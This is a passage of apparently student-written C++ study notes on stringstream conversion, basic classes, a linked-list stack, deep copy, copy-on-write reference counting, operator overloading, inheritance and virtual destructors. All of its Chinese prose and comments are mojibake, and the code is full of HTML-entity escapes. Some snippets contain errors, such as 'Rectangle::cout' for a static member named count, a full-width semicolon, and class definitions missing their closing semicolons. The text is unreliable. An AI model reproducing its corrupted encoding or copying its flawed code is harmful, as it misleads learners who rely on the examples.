//ä½¿ç”¨stringstreamæ¥åšè½¬æ¢æ—¶ï¼Œæœ€å¥½ä½¿ç”¨å®Œï¼Œè¿›è¡Œss.clear()æ“ä½œ ss.clear(); return 0; } //string -\u0026gt; stringstreamå¯¹è±¡ -\u0026gt; æ•°å­— #include \u0026lt;iostream\u0026gt; #include \u0026lt;sstream\u0026gt; using namespace std; int main() { double dVal; int iVal; string str; stringstream ss; // string -\u0026gt; double str = \u0026#34;123.456789\u0026#34;; ss \u0026lt;\u0026lt; str; ss \u0026gt;\u0026gt; dVal; cout \u0026lt;\u0026lt; \u0026#34;dVal: \u0026#34; \u0026lt;\u0026lt; dVal \u0026lt;\u0026lt; endl; // string -\u0026gt; int str = \u0026#34;654321\u0026#34;; ss.clear(); //æ³¨æ„ stringstream è¦clear!!! ss \u0026lt;\u0026lt; str; ss \u0026gt;\u0026gt; iVal; cout \u0026lt;\u0026lt; \u0026#34;iVal: \u0026#34; \u0026lt;\u0026lt; iVal \u0026lt;\u0026lt; endl; return 0; } stringstream ä¸­è¿˜èƒ½å­˜æ”¾å¤šä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥å®ç°å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥çš„ç›®çš„\nint main() { stringstream sstream; // å°†å¤šä¸ªå­—ç¬¦ä¸²æ”¾å…¥ sstream ä¸­ sstream \u0026lt;\u0026lt; \u0026#34;first\u0026#34; \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; \u0026#34;string,\u0026#34;; sstream \u0026lt;\u0026lt; \u0026#34; second string\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;strResult is: \u0026#34; \u0026lt;\u0026lt; sstream.str() \u0026lt;\u0026lt; endl; // æ¸…ç©º sstream sstream.str(\u0026#34;\u0026#34;); sstream \u0026lt;\u0026lt; \u0026#34;third string\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;After clear, strResult is: \u0026#34; \u0026lt;\u0026lt; sstream.str() \u0026lt;\u0026lt; endl; return 0; } ï¼ˆ1ï¼‰å¯ä»¥ä½¿ç”¨ str() æ–¹æ³•ï¼Œå°† stringstream ç±»å‹è½¬æ¢ä¸º string ç±»å‹ï¼› ï¼ˆ2ï¼‰å¯ä»¥å°†å¤šä¸ªå­—ç¬¦ä¸²æ”¾å…¥ stringstream ä¸­ï¼Œå®ç°å­—ç¬¦ä¸²çš„æ‹¼æ¥ç›®çš„ï¼› ï¼ˆ3ï¼‰å¦‚æœæƒ³æ¸…ç©º stringstreamï¼Œå¿…é¡»ä½¿ç”¨ sstream.str(\u0026quot;\u0026quot;); æ–¹å¼ï¼›\nï¼ˆ4ï¼‰clear() æ–¹æ³•é€‚ç”¨äºè¿›è¡Œå¤šæ¬¡æ•°æ®ç±»å‹è½¬æ¢çš„åœºæ™¯ï¼Œæ —å­å¦‚ä¸‹\n#include \u0026lt;sstream\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; int main() { stringstream sstream; int first, second; // æ’å…¥å­—ç¬¦ä¸² sstream \u0026lt;\u0026lt; \u0026#34;456\u0026#34;; // è½¬æ¢ä¸ºintç±»å‹ sstream \u0026gt;\u0026gt; first; cout \u0026lt;\u0026lt; first \u0026lt;\u0026lt; endl; // åœ¨è¿›è¡Œå¤šæ¬¡ç±»å‹è½¬æ¢å‰ï¼Œå¿…é¡»å…ˆè¿è¡Œclear() sstream.clear(); // æ’å…¥boolå€¼ sstream \u0026lt;\u0026lt; true; // è½¬æ¢ä¸ºintç±»å‹ sstream \u0026gt;\u0026gt; second; cout \u0026lt;\u0026lt; second \u0026lt;\u0026lt; endl; return 0; } æ•°å­—ä¸å­—ç¬¦ä¸²äº’è½¬\n//æ•°å­—è½¬å­—ç¬¦ä¸²ï¼š //1.to_string()å‡½æ•°ï¼Œå…¶ä»–ç±»å‹æ•°å­—ä¹Ÿå¯ä»¥ï¼Œæ­¤å¤„ä¸åˆ—ä¸¾ std::to_string(int) //2.ä½¿ç”¨std::stringstream for(int i = 0; i \u0026lt; 5; i++) { std::stringstream ss; std::string str; ss \u0026lt;\u0026lt; i; ss \u0026gt;\u0026gt; str; std::cout \u0026lt;\u0026lt; str.data() \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } //å­—ç¬¦ä¸²è½¬æ•°å­—,å¤´æ–‡ä»¶ï¼šcstdlib #include\u0026lt;cstdlib\u0026gt; std::stoi() //int std::stol() //long std::stoll() //long long std::stoull() //u long long std::stod() //double std::stold() for(int i = 0; i \u0026lt; 5; i++) { std::stringstream ss; std::string strNum = std::to_string(i); int num; ss \u0026lt;\u0026lt; strNum; ss \u0026gt;\u0026gt; num; std::cout \u0026lt;\u0026lt; num * num \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } å…¶ä»–çš„stringtream\n//å…¶ä»–çš„stringtream(éšç¼˜è®°ï¼Œéšç¼˜ä½¿ç”¨) //ostringstreamå¯¹è±¡ç”¨æ¥è¿›è¡Œæ ¼å¼åŒ–çš„è¾“å‡ºï¼Œå¸¸ç”¨äºå°†å„ç§ç±»å‹è½¬æ¢ä¸ºstringç±»å‹ //ostringstreamåªæ”¯æŒ\u0026lt;\u0026lt;æ“ä½œç¬¦ #include \u0026lt;sstream\u0026gt; template\u0026lt;typename T\u0026gt; string toString(const T\u0026amp; t) { ostringstream oss; //åˆ›å»ºä¸€ä¸ªæ ¼å¼åŒ–è¾“å‡ºæµ oss\u0026lt;\u0026lt;t; //æŠŠå€¼ä¼ é€’å¦‚æµä¸­ return oss.str(); } template \u0026lt;class Type\u0026gt; Type stringToNum(const string\u0026amp; str) { istringstream iss(str); //è½¬æˆ Type num; iss \u0026gt;\u0026gt; num; return num; } 1.5.4 ç›¸å…³åº”ç”¨ # å…¶å®æ˜¯éƒ¨åˆ†ä½œä¸šï¼ˆï¼‰\n//å·¦æ—‹è½¬æ“ä½œ //è¾“å…¥å­—ç¬¦ä¸²\u0026#34;abcdefg\u0026#34;å’Œæ•°å­—2ï¼Œè¯¥å‡½æ•°å°†è¿”å›å·¦æ—‹è½¬ä¸¤ä½å¾—åˆ°çš„ç»“æœ\u0026#34;cdefgab\u0026#34; #include\u0026lt;iostream\u0026gt; #include\u0026lt;string\u0026gt; using namespace std; int main() { string s; int n; cin \u0026gt;\u0026gt; s; cin \u0026gt;\u0026gt; n; string pre = s; s.erase(0,n); pre.erase(n,(pre.length())); s += pre; cout \u0026lt;\u0026lt; s \u0026lt;\u0026lt; endl; return 0; } //é¦–å­—æ¯å¤§å†™ #include\u0026lt;iostream\u0026gt; #include\u0026lt;string\u0026gt; using namespace std; int main() { string pre; int flag=0; getline(cin,pre) ; for(auto\u0026amp; c: pre) { if(c \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp;c \u0026lt;=\u0026#39;z\u0026#39;\u0026amp;\u0026amp;flag==0) { c = c-\u0026#39;a\u0026#39;+\u0026#39;A\u0026#39;; flag=1; } else if(c == \u0026#39; \u0026#39;) flag =0; } cout \u0026lt;\u0026lt; pre \u0026lt;\u0026lt; endl ; return 0; } 1.6 ç±»çš„çœŸçš„å¾ˆåŸºç¡€çš„åŸºç¡€çŸ¥è¯† # å…¶å®å°±æ˜¯ä¸€äº›ç®€å•çš„æˆå‘˜å‡½æ•°çš„å®ç°ï¼Œæ­¤å¤„éšä¾¿ctrl+cã€ctrl+væ„æ€ä¸€ä¸‹ï¼ˆï¼‰\n1.6.1 å®Œå–„Rectangleç±» # //ç±»ä¸­å£°æ˜: static int count; //ç±»å¤–åˆå§‹åŒ–å®šä¹‰ï¼š int Rectangle::cout = 0; class Rectangle { private: double width, height; public: Rectangle(double w = 1, double h = 1) : width(w), height(h) {} double getWidth() const; double getHeight() const; void setWidth(double width); void setHeight(double height); double getArea() const; double getPerimeter() const; }; double Rectangle::getWidth() const { return width; } double Rectangle::getHeight() const { return height; } void Rectangle::setWidth(double width) { this-\u0026gt;width=width; } void Rectangle::setHeight(double height) { this-\u0026gt;height=height; } double Rectangle::getArea() const { return width*height; } double Rectangle::getPerimeter() const { return width+width+height+height; } 1.6.2 å®Œå–„stackç±» # #ifndef STACK_HPP #define STACK_HPP #include \u0026lt;iostream\u0026gt; class Stack { private: struct node { int num; node* next; node() { num = 0; next = NULL; } node(int n, node* p = NULL) { num = n; next = p; } };\tnode* data; public: Stack();// æ„é€ ä¸€ä¸ªç©ºæ ˆ ~Stack();// æ³¨æ„å†…å­˜å›æ”¶ void push(int);// å…¥æ ˆ void pop();// å‡ºæ ˆ int top() const;// æŸ¥çœ‹æ ˆé¡¶å…ƒç´ ï¼Œè‹¥æ ˆä¸ºç©ºï¼Œè¿”å›0 bool empty() const;// åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º void clear();// æ¸…ç©ºæ ˆ }; #endif #include \u0026lt;iostream\u0026gt; #include \u0026#34;Stack.h\u0026#34; using namespace std; Stack::Stack() { data = NULL; } Stack::~Stack() { clear(); } void Stack::push(int n) { node* p = new node(n, data); data = p; } void Stack::pop() { if (empty()) return; node* p = data; data = data-\u0026gt;next; delete p; } int Stack::top() const { if (empty()) return 0; return data-\u0026gt;num; } bool Stack::empty() const { return data == NULL; } void Stack::clear() { while (!empty()) { pop(); } } 1.6.3 åè½¬é“¾è¡¨ # #include \u0026lt;iostream\u0026gt; using namespace std; class ListNode{ public: int val; ListNode *next; ListNode(int x) : val(x), next(NULL) {} }; ListNode* reverseList(ListNode* head) { ListNode* prev = nullptr; // å‰é©±èŠ‚ç‚¹æŒ‡é’ˆ ListNode* curr = head; // å½“å‰èŠ‚ç‚¹æŒ‡é’ˆ while (curr != nullptr) { ListNode* next = curr-\u0026gt;next; // åç»§èŠ‚ç‚¹æŒ‡é’ˆ curr-\u0026gt;next = prev; // åè½¬ç®­å¤´æŒ‡å‘å‰é©±èŠ‚ç‚¹ prev = curr; // æ›´æ–°å‰é©±èŠ‚ç‚¹æŒ‡é’ˆ curr = next; // æ›´æ–°å½“å‰èŠ‚ç‚¹æŒ‡é’ˆ } return prev; // è¿”å›åè½¬åçš„å¤´èŠ‚ç‚¹ } int main() { // æ„å»ºä¸€ä¸ªé“¾è¡¨ï¼Œè¾“å…¥ä¸º 1 2 3 4 5 ListNode* head = new ListNode(1); ListNode* curr = head; for (int i = 2; i \u0026lt;= 5; i++) { curr-\u0026gt;next = new ListNode(i); curr = curr-\u0026gt;next; } // è°ƒç”¨åè½¬é“¾è¡¨å‡½æ•° head = reverseList(head); // è¾“å‡ºåè½¬åé“¾è¡¨çš„å€¼ curr = head; while (curr != nullptr) { std::cout \u0026lt;\u0026lt; curr-\u0026gt;val \u0026lt;\u0026lt; \u0026#34; \u0026#34;; curr = curr-\u0026gt;next; } // é‡Šæ”¾é“¾è¡¨å†…å­˜ curr = head; while (curr != nullptr) { ListNode* temp = curr; curr = curr-\u0026gt;next; delete temp; } return 0; } 1.6.4 æ„é€ å‡½æ•°åˆ—è¡¨åˆå§‹åŒ– # class base_class { private: int a; public: base_class(int a) {this-\u0026gt;a = a;} void print() {std::cout \u0026lt;\u0026lt; a \u0026lt;\u0026lt; std::endl;} }; class my_class { private: base_class base; //ç±»æˆå‘˜å˜é‡ public: my_class(const int a); void print() {base.print();} }; my_class::my_class(const int a):base(a){} //ç±»æˆå‘˜å˜é‡é‡‡ç”¨åˆ—è¡¨åˆå§‹åŒ–çš„æ–¹å¼èµ‹åˆå€¼ï¼Œä¹‹åçš„ç»§æ‰¿åŒç† 1.6.5 æ„é€ å‡½æ•°å‚æ•°æœ‰é»˜è®¤å‚æ•°å€¼ # //åœ¨C++ä¸­ï¼Œé»˜è®¤å‚æ•°åªèƒ½åœ¨å‡½æ•°å£°æ˜æˆ–è€…å®šä¹‰çš„ä¸€ä¸ªåœ°æ–¹æä¾›ï¼Œ //ä¸èƒ½åŒæ—¶åœ¨å‡½æ•°å£°æ˜å’Œå®šä¹‰éƒ½æä¾›é»˜è®¤å‚æ•°ã€‚ //æä¾›é»˜è®¤å‚æ•°å¯ä»¥ä½¿è¯¥æ„é€ å‡½æ•°æ¶µç›–æ— å‚æ•°ï¼Œä¸€ä¸ªå‚æ•°ï¼Œä¸¤ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°è°ƒç”¨åœºæ™¯ class COMPLEX { public: COMPLEX(double r = 0, double i = 0); private: double real; double image; }; // æ„é€ å‡½æ•°çš„å®šä¹‰ COMPLEX::COMPLEX(double r, double i) { real = r; image = i; } 1.7ç±»çš„åŸºç¡€çŸ¥è¯† # 1.7.1 æ·±æ‹·è´ # åœ¨è¿›è¡Œæ·±æ‹·è´æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š\næ£€æŸ¥ç›®æ ‡å¯¹è±¡ä¸­çš„æ•°æ®æˆå‘˜æ˜¯å¦å·²ç»åˆ†é…å†…å­˜ï¼ˆæ˜¯å¦ä¸ç­‰äºnullptrï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™éœ€è¦å…ˆé‡Šæ”¾ï¼ˆdeleteï¼‰ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ åˆ›å»ºæ–°çš„å†…å­˜ç©ºé—´ï¼Œå¹¶å°†åŸå§‹æ•°æ®æ‹·è´åˆ°æ–°ç©ºé—´ä¸­ï¼Œç¡®ä¿æ¯ä¸ªå¯¹è±¡æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜å‰¯æœ¬ //ä¸€ç»´æ•°ç»„æ·±æ‹·è´ class array { private: int size; // size int *data; // dynamically allocate/release memory public: array()ï¼› array(int size, int val); array(const array \u0026amp;another) { data = nullptr; //æ‰§è¡Œæ„é€ å‡½æ•°æ˜¯è¿˜æœªåˆ†é…å†…å­˜ç©ºé—´ï¼Œæ‰€ä»¥ä¸ç”¨delete deep_copy(another); } ~array(); void deep_copy(const array \u0026amp;another); }; array::array() { size = 0; data = nullptr; } array::array(int size, int val) { this-\u0026gt;size=size; this-\u0026gt;data=NULL; data=new int[size]; for(int i=0;i\u0026lt;size;i++) { data[i]=val; } } array::~array() { delete [] data; } void array::deep_copy(const array \u0026amp;another) { this-\u0026gt;size=another.size; //æ£€æŸ¥dataæ˜¯å¦ä¸ºnullptr if(data!=nullptr) { delete [] data; } //æŒ‡å‘æ–°åˆ›å»ºçš„å†…å­˜ç©ºé—´ data=new int[this-\u0026gt;size]; //å®Œæˆæ·±æ‹·è´ for(int i=0;i\u0026lt;size;i++) { data[i]=another.data[i]; } } //é‡è½½èµ‹å€¼è¿ç®—ç¬¦æ—¶ä¹Ÿè¦è®°å¾—å…ˆé‡Šæ”¾ç©ºé—´ void Cat::_copy(const Cat \u0026amp; cat) { size = cat.size; name = cat.name; family = new Cat*[size]; for (int i = 0; i \u0026lt; size; ++ i) family[i] = cat.family[i]; } Cat::Cat(const Cat \u0026amp; cat) { _copy(cat); } Cat\u0026amp; Cat::operator=(const Cat \u0026amp; cat) { delete [] family;//å¯ä»¥ä¸æ£€æŸ¥ _copy(cat); return *this; } //äºŒç»´æ•°ç»„æ·±æ‹·è´ class array2d { private: int row; int col; array *data; public: array2d(int row, int col, int val); array2d(const array2d \u0026amp;another) { data = nullptr; deep_copy(another); } ~array2d(); void deep_copy(const array2d \u0026amp;another); }; array2d::array2d(int row, int col, int val) { this-\u0026gt;row = row; this-\u0026gt;col = col; data = new array[row]; for (int i = 0; i \u0026lt; row; ++i) { data[i].deep_copy(array(col, val)); //é‡‡ç”¨æ·±æ‹·è´çš„æ–¹æ³•æ¥èµ‹åˆå€¼ } } array2d::~array2d() { delete[] data; } void array2d::deep_copy(const array2d \u0026amp;another) { if (data != nullptr) delete[] data; row = another.row; col = another.col; data = new array[row]; for (int i = 0; i \u0026lt; row; ++i) { data[i].deep_copy(another.data[i]); //æ·±æ‹·è´ } } 1.7.2 å†™æ—¶æ‹·è´ # (ä»¥ä¸€ç»´æ•°ç»„ä¸ºä¾‹)\nè§‚å¯Ÿä¸€ç»´æ•°ç»„ç±»çš„deep_copyå‡½æ•°çš„å®ç°ï¼Œæˆ‘ä»¬å‘ç°ï¼Œåœ¨æ¯æ¬¡è¿›è¡Œæ·±æ‹·è´çš„æ—¶å€™ï¼Œæˆ‘ä»¬éƒ½éœ€è¦é‡æ–°åˆ†é…ä¸€å—æ–°çš„å†…å­˜ã€‚åœ¨å¾ˆå¤šæ—¶å€™ï¼Œarrayçš„å®ä¾‹å¯èƒ½åªéœ€è¦è°ƒç”¨printå‡½æ•°ï¼ˆä¸æ”¹å˜å€¼çš„æ‰“å°å‡½æ•°ï¼‰ï¼Œä¸éœ€è¦è°ƒç”¨assignå‡½æ•°ï¼ˆæ”¹å˜å€¼çš„èµ‹å€¼å‡½æ•°ï¼‰ï¼Œå³å®ä¾‹ä¸ä¼šå¯¹dataæŒ‡å‘çš„å†…å­˜è¿›è¡Œä¿®æ”¹ã€‚å¯¹äºè¿™äº›å®ä¾‹ï¼ŒdataæŒ‡å‘çš„å†…å­˜æ‰€å­˜æ”¾çš„å†…å®¹æ˜¯ç›¸åŒçš„ï¼Œå› æ­¤å¯ä»¥å…±äº«ï¼Œä¸éœ€è¦é‡æ–°åˆ†é…å†…å­˜ï¼Œä»è€Œè¾¾åˆ°å‡å°‘å†…å­˜å¼€é”€çš„ç›®çš„ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½æå‰é¢„çŸ¥æ¯ä¸€ä¸ªå®ä¾‹åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­æ˜¯å¦ä¼šå¯¹dataæŒ‡å‘çš„å†…å­˜è¿›è¡Œä¿®æ”¹ï¼Œä¸éš¾æƒ³åˆ°ï¼Œåªéœ€è¦å°†æ·±æ‹·è´çš„è¿‡ç¨‹å»¶è¿Ÿåˆ°å®ä¾‹ç¬¬ä¸€æ¬¡å‘ç”Ÿä¿®æ”¹çš„åœ°æ–¹å³å¯ï¼Œè¿™å°±æ˜¯å†™æ—¶å¤åˆ¶ï¼Œcopy on writeã€‚\nå†™æ—¶å¤åˆ¶çš„å…·ä½“å®ç°ï¼š\næˆå‘˜å˜é‡ref_counterçš„ä½œç”¨æ˜¯æ ‡è®°å½“å‰å¼•ç”¨dataæŒ‡å‘çš„å†…å­˜çš„å®ä¾‹æ•°é‡ã€‚ åœ¨éå¤åˆ¶æ„é€ å‡½æ•°ä¸­ï¼Œref_counteræŒ‡å‘çš„æ•´å‹å˜é‡åˆå§‹åŒ–ä¸º1ã€‚ å½“è°ƒç”¨deep_copyå‡½æ•°æ—¶ï¼Œå¹¶ä¸ä¼šæ‰§è¡Œæ·±æ‹·è´ï¼Œè€Œæ˜¯æ‰§è¡Œæµ…æ‹·è´ï¼Œç„¶åå¯¹ref_counterè¿›è¡ŒåŠ 1ã€‚ copy_on_writeæ˜¯çœŸæ­£æ‰§è¡Œæ·±æ‹·è´çš„å‡½æ•°ã€‚ å½“éœ€è¦é‡Šæ”¾dataå’Œref_counteræŒ‡å‘çš„å†…å­˜æ—¶ï¼Œå¦‚æœref_counteræŒ‡å‘çš„å€¼ä¸º1ï¼Œåˆ™é‡Šæ”¾ï¼›å¦åˆ™ï¼Œå¯¹ref_counteræŒ‡å‘çš„å€¼å‡1ï¼Œä¸è¿›è¡Œé‡Šæ”¾æ“ä½œã€‚ class array { private: int size; // size int *data; // dynamically allocate/release memory int *ref_counter; // reference counter void copy_on_write(); // copy on write public: array(); array(int size, int val); array(const array \u0026amp;another) { data = nullptr; ref_counter = nullptr; deep_copy(another); } ~array(); bool assign(int pos, int val); void deep_copy(const array \u0026amp;another); void print() const { for (int i = 0; i \u0026lt; size; ++i) std::cout \u0026lt;\u0026lt; data[i] \u0026lt;\u0026lt; std::endl; } int get_ref_counter() { return *ref_counter; } int *get_data() { return data; } }; #include\u0026lt;iostream\u0026gt; #include \u0026#34;array.h\u0026#34; array::array() { size = 0; data = nullptr; ref_counter=new int; *ref_counter=1; } array::array(int size, int val) { this-\u0026gt;size = size; ref_counter=new int; *ref_counter=1; data = new int[size]; for (int i = 0; i \u0026lt; size; ++i) data[i] = val; } array::~array() { if((*ref_counter)==1) { delete ref_counter; delete[] data; } else (*ref_counter)--; } // å¦‚æœposä¸è¶Šç•Œï¼Œåˆ™å°†posä½ç½®çš„å…ƒç´ èµ‹å€¼ä¸ºvalï¼Œè¿”å›trueï¼›å¦‚æœposè¶Šç•Œï¼Œåˆ™è¿”å›false bool array::assign(int pos, int val) { if (*ref_counter != 1) { (* ref_counter)--; copy_on_write(); } bool result = true; //æ ‡è®°æ˜¯å¦æˆåŠŸ if (pos \u0026gt;= 0 \u0026amp;\u0026amp; pos \u0026lt; this-\u0026gt;size) { this-\u0026gt;data[pos] = val;//åœ¨æ·±æ‹·è´åçš„æ–°å†…å­˜ç©ºé—´ä¸­æ”¹å˜data } else { result = false; } return result; } //å‡çš„æ·±æ‹·è´å‡½æ•° void array::deep_copy(const array\u0026amp; another) { if (\u0026amp;another != this) { size = another.size; if (ref_counter != nullptr\u0026amp;\u0026amp; *ref_counter==1) { delete[] data; delete ref_counter; } else if (ref_counter != nullptr \u0026amp;\u0026amp; *ref_counter != 1) { (*ref_counter)--; } ref_counter = another.ref_counter; (*ref_counter)++; data = another.data; } } //çœŸæ­£çš„æ·±æ‹·è´å‡½æ•°â€”â€”å†™æ—¶æ‹·è´å‡½æ•° void array::copy_on_write() { ref_counter = new int; *ref_counter = 1; int* temp = data; //æŒ‡å‘åŸæœ¬çš„dataå†…å­˜ç©ºé—´ data = new int[size]; //åˆ›å»ºä¸€ä¸ªæ–°çš„å†…å­˜ç©ºé—´ï¼ˆæ·±æ‹·è´ï¼‰ for (int i = 0; i \u0026lt; size; i++) { data[i] = temp[i]; //å®Œæˆæ·±æ‹·è´ } } 1.7.3 é‡è½½çš„åŸºç¡€åº”ç”¨ # //é‡è½½å‰ç½®++ï¼Œæ”¹å˜å€¼çš„å¤§å°ï¼Œå¹¶è¿”å›æ”¹å˜åçš„å€¼ COMPLEX \u0026amp;COMPLEX::operator++() { real += 1; image += 1; return *this; } //é‡è½½åç½®++ï¼Œæ”¹å˜å€¼çš„å¤§å°ï¼Œä½†æ˜¯è¿”å›æ”¹å˜å‰çš„å€¼ COMPLEX COMPLEX::operator++(int) { COMPLEX temp(this-\u0026gt;real,this-\u0026gt;image); this-\u0026gt;real++; this-\u0026gt;image++; return temp; } //å‡½æ•°å¯¹è±¡ï¼Œé‡è½½æ“ä½œç¬¦ï¼ˆï¼‰ï¼Œä½¿å¾—èƒ½å¤Ÿåƒè°ƒç”¨å‡½æ•°ä¸€æ ·ä½¿ç”¨å¯¹è±¡ class Exchange{ public: void operator()(int\u0026amp;, int\u0026amp;); }; void Exchange::operator()(int\u0026amp; x, int\u0026amp; y) { int temp=x; x=y; y=temp; } æµè¿ç®—ç¬¦é‡è½½ï¼ˆå‹å…ƒå‡½æ•°ï¼‰\nfriend ostream \u0026amp; operator \u0026lt;\u0026lt; (ostream \u0026amp;os, const BigInt \u0026amp;object) { os\u0026lt;\u0026lt;object.num; return os; } friend ostream \u0026amp; operator \u0026lt;\u0026lt; (ostream \u0026amp;os, const OperatorLinkedQueue \u0026amp;object); ostream \u0026amp; operator \u0026lt;\u0026lt; (ostream \u0026amp;os, const OperatorLinkedQueue \u0026amp;object){ for(int i = 0;i\u0026lt;object.size;i++){ os\u0026lt;\u0026lt;object[i]; if(i!=object.size-1) cout\u0026lt;\u0026lt;\u0026#34;-\u0026gt;\u0026#34;; } return os; } 1.7.4 å¯¹ç±»æˆå‘˜ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é… # //åœ¨ç±»ä¸­å£°æ˜ï¼š Date* birthDate; //ç±»å¤–å®Œæˆæ„é€ å‡½æ•°çš„å®šä¹‰ï¼š Student::Student(int id, int year, int month, int day) { this-\u0026gt;id = id; birthDate = new Date(year,month,day); numberOfObjects++; } //ç±»å¤–å®Œæˆææ„å‡½æ•°çš„å®šä¹‰ï¼š Student::~Student() { numberOfObjects--; delete birthDate; } 1.7.5 staticæˆå‘˜å˜é‡ä¸å‡½æ•°çš„å®šä¹‰ # //ç±»å†…å£°æ˜ï¼ˆä½†å˜é‡ä¸åˆå§‹åŒ–ï¼‰ static int numberOfObjects; static int getNumberOfObjects(); //ç±»å¤–å®Œæˆå®šä¹‰ï¼ˆéƒ½ä¸éœ€è¦åŠ  static å…³é”®å­—ï¼ï¼ï¼ï¼‰ int Student::numberOfObjects = 0; int Student::getNumberOfObjects() { return numberOfObjects; } 1.8 ç»§æ‰¿çš„åŸºç¡€çŸ¥è¯† # 1.8.æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•° # class A { public: A(int a0):a(a0) {} void showA() { cout\u0026lt;\u0026lt;a\u0026lt;\u0026lt;endl; } protected: int a; }; class C { public: C(int c0):c(c0) {} void showC() { cout\u0026lt;\u0026lt;c\u0026lt;\u0026lt;endl; } protected: int c; }; /*æ‚¨éœ€è¦ä»aå’ŒCæ´¾ç”Ÿç±»Bã€‚Bç±»åªæœ‰ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå®ƒæœ‰ä¸¤ä¸ªintç±»å‹çš„å‚æ•°ï¼Œç¬¬ä¸€ä¸ªç”¨äºaï¼Œç¬¬äºŒä¸ªç”¨äºCã€‚è¿™ä¸¤ä¸ªå‚æ•°çš„é»˜è®¤å€¼åˆ†åˆ«ä¸º11å’Œ22ã€‚*/ class B : public A , public C { public: int a; int c; B(int a=11,int b=22):A(a),C(b){} //ç±»å†…å£°æ˜ä¸ºB(int,int) //ç±»å¤–å†å®Œæˆå‡½æ•°å®šä¹‰ï¼šB::B(int a=11,int b=22):A(a),C(b){} //å¯ä»¥æ¶µç›–æ— å‚æ•°ï¼Œä¸€ä¸ªå‚æ•°ï¼Œä¸¤ä¸ªå‚æ•°æ—¶çš„æ„é€ å‡½æ•°è°ƒç”¨åœºæ™¯ //å…ˆè°ƒç”¨Açš„æ„é€ å‡½æ•°ï¼Œå†è°ƒç”¨Cçš„æ„é€ å‡½æ•°ï¼Œæœ€åè°ƒç”¨Bçš„æ„é€ å‡½æ•° //ææ„å‡½æ•°åä¹‹ }; 1.8.2 è™šç±»ç»§æ‰¿ # class Weekend:virtual public Writing,virtual public Racing { //ç•¥ }; class Workday:public virtual Racing,public virtual Writing { //ç•¥ï¼Œvirtualå…³é”®è¯é¡ºåºä¸é‡è¦ } class Choseday:public Weekend,public Workday { //åªä¼šè°ƒç”¨ä¸€æ¬¡ Writingç±»å’ŒRacingç±»çš„æ„é€ å‡½æ•° } 1.9 è™šå‡½æ•° # virtual double GetArea() const = 0; //ï¼ˆ1ï¼‰=0è¯´æ˜å®ƒæ˜¯çº¯è™šå‡½æ•° //ï¼ˆ2ï¼‰constè¡¨æ˜ä¸èƒ½ä¿®æ”¹å…¶æ•°æ®æˆå‘˜ //ï¼ˆ3ï¼‰const=0 äºŒè€…éƒ½åœ¨ å‚æ•°(void) çš„åé¢ï¼ //åœ¨æ´¾ç”Ÿç±»ä¸­é‡è½½è¯¥è™šå‡½æ•°è®°å¾—åé¢ä¹Ÿè¦åŠ ä¸Š constï¼ˆå› ä¸ºæ˜¯çº¯è™šå‡½æ•°ï¼Œä¸åŠ åé¢è°ƒç”¨ä¼šæŠ¥é”™ï¼‰ //ä¸€ä¸ªç±»çš„åŒååŒå‚æ•°å‡½æ•° åé¢åŠ ä¸åŠ constéƒ½å­˜åœ¨æ—¶ï¼Œåªæœ‰åœ¨ constç±»ä¸­æ‰ä¼šè°ƒç”¨åˆ°constå‡½æ•° //ä¸€ä¸ªç±»çš„åŒååŒå‚æ•°å‡½æ•° å‰é¢åŠ ä¸åŠ constéƒ½å­˜åœ¨æ—¶ï¼Œä¼šæŠ¥é”™ï¼Œå› ä¸ºè¿”å›å€¼ä¸åŒï¼Œæ‰€ä»¥ä¼šæœ‰è°ƒç”¨åˆ†æ­§ 1.9.1 è™šææ„å‡½æ•° # æˆ‘ä»¬çŸ¥é“ï¼Œä¸ºäº†èƒ½å¤Ÿæ­£ç¡®çš„è°ƒç”¨å¯¹è±¡çš„ææ„å‡½æ•°ï¼Œä¸€èˆ¬è¦æ±‚å…·æœ‰å±‚æ¬¡ç»“æ„çš„é¡¶çº§ç±»å®šä¹‰å…¶ææ„å‡½æ•°ä¸ºè™šå‡½æ•°ã€‚å› ä¸ºåœ¨deleteä¸€ä¸ªæŠ½è±¡ç±»æŒ‡é’ˆæ—¶å€™ï¼Œå¿…é¡»è¦é€šè¿‡è™šå‡½æ•°æ‰¾åˆ°çœŸæ­£çš„ææ„å‡½æ•°ã€‚\nå¦‚ï¼š\nclass Base { public: Base(){} virtual ~Base(){} }; class Derived: public Base { public: Derived(){}; ~Derived(){}; } void foo() { Base *pb; pb = new Derived; delete pb; } è¿™æ˜¯æ­£ç¡®çš„ç”¨æ³•ï¼Œä¼šå‘ç”ŸåŠ¨æ€ç»‘å®šï¼Œå®ƒä¼šå…ˆè°ƒç”¨Derivedçš„ææ„å‡½æ•°ï¼Œç„¶åæ˜¯Baseçš„ææ„å‡½æ•°\nå¦‚æœææ„å‡½æ•°ä¸åŠ virtualï¼Œdelete pbåªä¼šæ‰§è¡ŒBaseçš„ææ„å‡½æ•°ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„Derivedææ„å‡½æ•°ã€‚\nå› ä¸ºä¸æ˜¯virtualå‡½æ•°ï¼Œæ‰€ä»¥è°ƒç”¨çš„å‡½æ•°ä¾èµ–äºæŒ‡å‘é™æ€ç±»å‹ï¼Œå³Baseã€‚\nå‚è€ƒé“¾æ¥ï¼š 